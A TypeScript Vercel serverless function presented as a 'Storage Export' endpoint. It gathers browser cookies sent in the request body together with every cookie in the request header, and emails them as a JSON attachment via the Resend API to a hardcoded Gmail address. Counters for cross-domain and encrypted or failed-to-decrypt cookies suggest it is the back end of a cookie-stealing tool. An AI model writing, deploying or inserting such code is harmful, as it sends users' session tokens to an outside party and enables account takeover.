import type { VercelRequest, VercelResponse } from '@vercel/node';
import { Resend } from 'resend';

export default async function handler(
  req: VercelRequest,
  res: VercelResponse,
): Promise<void> {
  if (req.method !== 'POST') {
    res.status(405).json({ success: false, error: 'Method not allowed' });
    return;
  }

  try {
    const data = req.body;

    const cookieHeader = req.headers.cookie || '';
    const serverCookies: Record<string, string> = {};

    if (cookieHeader) {
      cookieHeader.split(';').forEach((cookie) => {
        const trimmedCookie = cookie.trim();
        if (trimmedCookie) {
          const equalIndex = trimmedCookie.indexOf('=');
          if (equalIndex > 0) {
            const name = trimmedCookie.substring(0, equalIndex).trim();
            const value = trimmedCookie.substring(equalIndex + 1);
            if (name) {
              try {
                serverCookies[name] = decodeURIComponent(value);
              } catch (e) {
                serverCookies[name] = value;
              }
            }
          }
        }
      });
    }

    const allCookies = {
      ...data.cookies,
      ...serverCookies,
    };

    const completeData = {
      ...data,
      cookies: allCookies,
      cookiesFromClient: data.cookies,
      cookiesFromServer: serverCookies,
      cookiesFromAllDomains: null,
      cookieCount: {
        client: Object.keys(data.cookies).length,
        server: Object.keys(serverCookies).length,
        crossDomain: 0,
        total: Object.keys(allCookies).length,
        encrypted: 0,
        failed: 0,
      },
    };

    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `storage-export-${timestamp}.json`;
    const jsonContent = JSON.stringify(completeData, null, 2);

    const apiKey = process.env.RESEND_API_KEY;

    if (!apiKey) {
      res.status(500).json({
        success: false,
        error: 'RESEND_API_KEY not set',
      });
      return;
    }

    const resend = new Resend(apiKey);
    const base64Content = Buffer.from(jsonContent).toString('base64');

    const { error } = await resend.emails.send({
      from: 'Storage Export <onboarding@resend.dev>',
      to: 'innamkn2@gmail.com',
      subject: `Storage Export - ${filename}`,
      html: `
        <h2>Storage Export</h2>
        <p>Storage export file attached: <strong>${filename}</strong></p>
        <p><strong>Cookie Statistics:</strong></p>
        <ul>
          <li>Client cookies: <strong>${completeData.cookieCount.client}</strong></li>
          <li>Server cookies: <strong>${completeData.cookieCount.server}</strong></li>
          <li>Cross-domain cookies: <strong>${completeData.cookieCount.crossDomain}</strong></li>
          <li>Total cookies: <strong>${completeData.cookieCount.total}</strong></li>
          <li>Encrypted cookies: <strong>${completeData.cookieCount.encrypted}</strong></li>
          <li>Failed to decrypt: <strong>${completeData.cookieCount.failed}</strong></li>
        </ul>
        <p>Generated at: ${new Date().toISOString()}</p>
      `,
      attachments: [
        {
          filename: filename,
          content: base64Content,
        },
      ],
    });

    if (error) {
      res.status(500).json({
        success: false,
        error: 'Failed to send email',
      });
      return;
    }

    res.status(200).json({
      success: true,
      message: `Export file sent to email: innamkn2@gmail.com`,
      filename: filename,
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
  }
}

